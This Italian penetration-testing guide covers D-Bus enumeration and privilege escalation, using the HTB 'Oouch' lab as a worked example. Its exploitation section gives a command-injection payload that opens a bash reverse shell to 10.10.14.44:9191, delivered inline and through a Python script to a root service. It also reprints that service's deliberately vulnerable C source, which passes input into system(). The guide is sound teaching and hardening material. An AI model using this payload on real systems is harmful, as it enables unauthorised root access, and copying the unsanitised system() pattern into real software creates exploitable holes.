# Enumerazione D-Bus ed escalation dei privilegi tramite Command Injection

## **Enumerazione GUI**

D-Bus viene utilizzato come mediatore per le comunicazioni inter-processo (IPC) negli ambienti desktop Ubuntu. Su Ubuntu, è osservato il funzionamento simultaneo di diversi message bus: il system bus, utilizzato principalmente dai **servizi privilegiati per esporre servizi rilevanti a livello di sistema**, e un session bus per ogni utente autenticato, che espone servizi rilevanti solo per quello specifico utente. L'attenzione è rivolta principalmente al system bus, a causa della sua associazione con servizi eseguiti con privilegi elevati (ad esempio, root), poiché il nostro obiettivo è elevare i privilegi. È importante notare che l'architettura di D-Bus impiega un 'router' per ogni session bus, responsabile del reindirizzamento dei messaggi dei client verso i servizi appropriati, in base all'indirizzo specificato dai client per il servizio con cui desiderano comunicare.<sup>[[1]](#references)</sup>

I servizi su D-Bus sono definiti dagli **oggetti** e dalle **interfacce** che espongono. Gli oggetti possono essere paragonati alle istanze delle classi nei comuni linguaggi OOP, dove ogni istanza è identificata univocamente da un **object path**. Questo percorso, simile a un percorso del filesystem, identifica univocamente ogni oggetto esposto dal servizio. Un'interfaccia importante ai fini della ricerca è l'interfaccia **org.freedesktop.DBus.Introspectable**, che presenta un singolo metodo, Introspect. Questo metodo restituisce una rappresentazione XML dei metodi, dei signals e delle proprietà supportati dall'oggetto; qui l'attenzione è rivolta ai metodi, omettendo proprietà e signals.

Per comunicare con l'interfaccia D-Bus sono stati utilizzati due strumenti: uno strumento CLI chiamato **gdbus**, per invocare facilmente gli exposed methods da D-Bus negli script, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uno strumento GUI basato su Python progettato per enumerare i servizi disponibili su ogni bus e visualizzare gli oggetti contenuti in ciascun servizio.
```bash
sudo apt-get install d-feet
```
Se stai controllando il **session bus**, conferma prima l'indirizzo corrente:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Nella prima immagine sono mostrati i servizi registrati con il system bus D-Bus, con **org.debin.apt** evidenziato dopo aver selezionato il pulsante System Bus. D-Feet interroga questo servizio per individuare gli oggetti, visualizzando interfacce, metodi, proprietà e segnali relativi agli oggetti selezionati, come mostrato nella seconda immagine. Viene inoltre mostrata nel dettaglio la signature di ogni metodo.

Una caratteristica importante è la visualizzazione del **process ID (pid)** e della **command line** del servizio, utile per verificare se il servizio viene eseguito con privilegi elevati, aspetto importante per la rilevanza della ricerca.

**D-Feet consente anche di invocare i metodi**: gli utenti possono inserire espressioni Python come parametri, che D-Feet converte in tipi D-Bus prima di passarle al servizio.

Tuttavia, è importante notare che **alcuni metodi richiedono l'autenticazione** prima di consentirne l'invocazione. Ignoreremo questi metodi, poiché il nostro obiettivo è elevare i privilegi senza credenziali.

È inoltre importante notare che alcuni servizi interrogano un altro servizio D-Bus chiamato org.freedeskto.PolicyKit1 per verificare se un utente debba essere autorizzato o meno a eseguire determinate azioni.

## **Enumerazione della Cmd line**

### Elencare gli oggetti dei servizi

È possibile elencare le interfacce D-Bus aperte con:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
I **servizi** contrassegnati come **`(activatable)`** sono particolarmente interessanti perché **non sono ancora in esecuzione**, ma una richiesta bus può avviarli su richiesta. Non fermarti a `busctl list`; associa quei nomi ai binari effettivi che eseguirebbero.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Questo ti indica rapidamente quale percorso `Exec=` verrà avviato per un nome attivabile e con quale identità. Se il binario o la sua catena di esecuzione sono protetti in modo insufficiente, un servizio inattivo può comunque diventare un percorso per l'escalation dei privilegi.

#### Connessioni

[Da wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Quando un processo configura una connessione a un bus, quest'ultimo assegna alla connessione un nome speciale chiamato _unique connection name_. I nomi del bus di questo tipo sono immutabili: è garantito che non cambieranno finché la connessione esiste e, cosa ancora più importante, non possono essere riutilizzati durante la vita del bus. Ciò significa che nessun'altra connessione a quel bus avrà mai assegnato lo stesso _unique connection name_, anche se lo stesso processo chiude la connessione al bus e ne crea una nuova. I _unique connection name_ sono facilmente riconoscibili perché iniziano con il carattere due punti, altrimenti vietato.<sup>[[4]](#references)</sup>

### Informazioni sull'oggetto del servizio

Successivamente, puoi ottenere alcune informazioni sull'interfaccia con:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Correla inoltre il nome del bus con la relativa unità `systemd` e il percorso dell'eseguibile:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Questo risponde alla domanda operativa importante durante il privesc: **se una method call ha successo, quale binario reale e quale unit eseguiranno l'azione?**

### Elencare le interfacce di un oggetto Service

È necessario disporre di autorizzazioni sufficienti.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Ispezionare l'interfaccia di un oggetto servizio

Nota come in questo esempio sia stata selezionata l'ultima interfaccia individuata utilizzando il parametro `tree` (_vedi sezione precedente_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Nota il metodo `.Block` dell'interfaccia `htb.oouch.Block` (quello che ci interessa). La "s" delle altre colonne potrebbe significare che si aspetta una string.

Prima di provare qualcosa di pericoloso, convalida innanzitutto un metodo **read-oriented** o comunque a basso rischio. In questo modo distingui chiaramente tre casi: sintassi errata, metodo raggiungibile ma negato, oppure metodo raggiungibile e consentito.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlare i metodi D-Bus con le policy e le azioni

L'introspection ti indica **che cosa** puoi chiamare, ma non ti dice **perché** una chiamata è consentita o negata. Per un triage privesc reale, di solito devi ispezionare insieme **tre livelli**:

1. **Metadati di activation** (file `.service` o `SystemdService=`) per scoprire quale binary e quale unit verranno effettivamente eseguiti.
2. **Policy XML D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) per scoprire chi può `own`, `send_destination` o `receive_sender`.
3. **File delle azioni Polkit** (`/usr/share/polkit-1/actions/*.policy`) per scoprire il modello di autorizzazione predefinito (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Comandi utili:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Non assumere una corrispondenza 1:1 tra un metodo D-Bus e un'azione Polkit. Lo stesso metodo può scegliere un'azione diversa a seconda dell'oggetto modificato o del contesto runtime. Pertanto, il workflow pratico è:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` e grep dei file `.policy` rilevanti
3. probe live a basso rischio con `busctl call`, `gdbus call` o `dbusmap --enable-probes --null-agent`

I servizi proxy o di compatibilità meritano particolare attenzione. Un **proxy in esecuzione come root** che inoltra richieste a un altro servizio D-Bus tramite una propria connessione precedentemente stabilita può accidentalmente far trattare al backend ogni richiesta come proveniente dall'UID 0, a meno che l'identità del chiamante originale non venga convalidata nuovamente.<sup>[[3]](#references)</sup>

### Interfaccia di monitoraggio/capture

Con privilegi sufficienti (i soli privilegi `send_destination` e `receive_sender` non sono sufficienti) puoi **monitorare una comunicazione D-Bus**.

Per **monitorare** una **comunicazione** devi essere **root**. Se continui a riscontrare problemi pur essendo root, consulta [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Se sai come configurare un file di configurazione D-Bus per **consentire agli utenti non root di sniffare** la comunicazione, **contattami**!

Diversi modi per monitorare:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Nell'esempio seguente l'interfaccia `htb.oouch.Block` viene monitorata e **il messaggio "**_**lalalalal**_**" viene inviato tramite una comunicazione errata**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Puoi usare `capture` invece di `monitor` per salvare i risultati in un file **pcapng** che Wireshark può aprire:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrare tutto il rumore <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Se sul bus ci sono semplicemente troppe informazioni, passa una regola di corrispondenza come questa:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
È possibile specificare più regole. Se un messaggio corrisponde a _una qualsiasi_ delle regole, il messaggio verrà stampato. In questo modo:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Consulta la [documentazione di D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) per ulteriori informazioni sulla sintassi delle match rule.<sup>[[7]](#references)</sup>

### Altro

`busctl` ha ancora più opzioni, [**trovale tutte qui**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Scenario vulnerabile**

Come utente **qtc all'interno dell'host "oouch" di HTB**, puoi trovare un **file di configurazione D-Bus imprevisto** situato in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Nota dalla configurazione precedente: **dovrai essere l'utente `root` o `www-data` per inviare e ricevere informazioni** tramite questa comunicazione D-BUS.

Come utente **qtc**, all'interno del docker container **aeb4525789d8**, puoi trovare del codice relativo a dbus nel file _/code/oouch/routes.py._ Questo è il codice interessante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Come puoi vedere, si sta **connettendo a un'interfaccia D-Bus** e inviando alla **funzione "Block"** il valore "client_ip".

Dall'altra parte della connessione D-Bus è in esecuzione un binario C compilato. Questo codice è **in ascolto** sulla connessione D-Bus **di un indirizzo IP e chiama iptables tramite la funzione `system`** per bloccare l'indirizzo IP fornito.\
**La chiamata a `system` è intenzionalmente vulnerabile a command injection**, quindi un payload come il seguente creerà una reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Sfruttarlo

Alla fine di questa pagina puoi trovare il **codice C completo dell'applicazione D-Bus**. Al suo interno, tra le righe 91-97, puoi trovare **come vengono registrati il `D-Bus object path`** **e il `interface name`**. Queste informazioni saranno necessarie per inviare dati alla connessione D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Inoltre, alla riga 57 puoi vedere che **l'unico metodo registrato** per questa comunicazione D-Bus si chiama `Block`(_**Per questo, nella sezione seguente, i payload verranno inviati all'oggetto servizio `htb.oouch.Block`, all'interfaccia `/htb/oouch/Block` e al nome del metodo `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Il seguente codice Python invierà il payload alla connessione D-Bus al metodo `Block` tramite `block_iface.Block(runme)` (_nota che è stato estratto dal precedente blocco di codice_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl e dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` è uno strumento utilizzato per inviare messaggi al “Message Bus”
- Message Bus – Un software utilizzato dai sistemi per facilitare la comunicazione tra le applicazioni. È correlato al Message Queue (i messaggi sono ordinati in sequenza), ma nel Message Bus i messaggi vengono inviati secondo un modello di sottoscrizione e anche molto rapidamente.
- Il tag “-system” viene utilizzato per indicare che si tratta di un messaggio di sistema, non di un messaggio di sessione (per impostazione predefinita).
- Il tag “–print-reply” viene utilizzato per stampare correttamente il nostro messaggio e ricevere eventuali risposte in un formato leggibile.
- “–dest=Dbus-Interface-Block” L'indirizzo dell'interfaccia Dbus.
- “–string:” – Il tipo di messaggio che desideriamo inviare all'interfaccia. Esistono diversi formati per l'invio dei messaggi, come double, bytes, booleans, int, objpath. Tra questi, “object path” è utile quando vogliamo inviare il percorso di un file all'interfaccia Dbus. In questo caso possiamo utilizzare un file speciale (FIFO) per passare un comando all'interfaccia usando il nome di un file. “string:;” – Questo serve a richiamare nuovamente l'object path, dove inseriamo il file/comando della reverse shell FIFO.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Helper per l'enumerazione automatizzata (2023-2025)

L'enumerazione manuale di una grande attack surface D-Bus con `busctl`/`gdbus` diventa rapidamente complicata. Due piccole utility FOSS rilasciate negli ultimi anni possono velocizzare le operazioni durante gli engagement di red-team o CTF:

### dbusmap ("Nmap for D-Bus")
* Autore: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Scritto in C; singolo binario statico (<50 kB) che percorre ogni object path, recupera l'XML `Introspect` e lo associa al PID/UID proprietario.<sup>[[5]](#references)</sup>
* Flag utili:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Lo strumento contrassegna i well-known names non protetti con `!`, rivelando immediatamente i servizi che è possibile *own* (prendere il controllo) o le method calls raggiungibili da una shell non privilegiata.

### uptux.py
* Autore: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Script scritto esclusivamente in Python che cerca path *writable* nelle unità systemd e file di policy D-Bus eccessivamente permissivi (ad esempio `send_destination="*"`).<sup>[[6]](#references)</sup>
* Utilizzo rapido:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Il modulo D-Bus cerca nelle directory seguenti ed evidenzia ogni servizio che può essere spoofed o hijacked da un utente normale:
* `/etc/dbus-1/system.d/` e `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Bug D-Bus notevoli di privilege escalation (2024-2025)

Tenere sotto controllo i CVE pubblicati di recente aiuta a individuare pattern insicuri simili nel custom code. Due buoni esempi recenti sono:<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Il servizio in esecuzione come root esponeva un'interfaccia D-Bus che gli utenti non privilegiati potevano riconfigurare, incluso il caricamento di macro behavior controllato dall'attacker. | Se un daemon espone **device/profile/config management** sul system bus, considera la configurazione writable e le funzionalità macro come primitive di code execution, non semplici "impostazioni". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Un compatibility proxy in esecuzione come root inoltrava richieste ai backend services senza preservare il security context del caller originale, pertanto i backend si fidavano del proxy come UID 0. | Considera i servizi D-Bus **proxy / bridge / compatibility** come una classe di bug separata: se inoltrano chiamate privilegiate, verifica come l'UID del caller e il contesto Polkit arrivano al backend. |

Pattern da osservare:
1. Il servizio viene eseguito **come root sul system bus**.
2. Non esiste alcun authorization check, oppure il check viene eseguito sul **soggetto sbagliato**.
3. Il metodo raggiungibile alla fine modifica lo stato del sistema: installazione di pacchetti, modifiche a utenti/gruppi, configurazione del bootloader, aggiornamenti dei device profile, scrittura di file o esecuzione diretta di comandi.

Usa `dbusmap --enable-probes` o una `busctl call` manuale per confermare se un metodo è raggiungibile, quindi esamina l'XML della policy del servizio e le azioni Polkit per capire **quale soggetto** viene effettivamente autorizzato.

---

## Hardening e quick-win per il rilevamento

* Cerca policy world-writable o aperte a *send/receive*:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Richiedi Polkit per i metodi pericolosi: anche i proxy *root* dovrebbero passare il PID del *caller* a `polkit_authority_check_authorization_sync()` invece del proprio.
* Riduci i privilegi negli helper a esecuzione prolungata (usa `sd_pid_get_owner_uid()` per cambiare namespace dopo la connessione al bus).
* Se non puoi rimuovere un servizio, almeno *scope* a un gruppo Unix dedicato e limita l'accesso nella sua policy XML.
* Blue-team: cattura il system bus con `busctl capture > /var/log/dbus_$(date +%F).pcapng` e importalo in Wireshark per il rilevamento di anomalie.

---

## References

- [1] [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service allows configuration by any unprivileged user](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
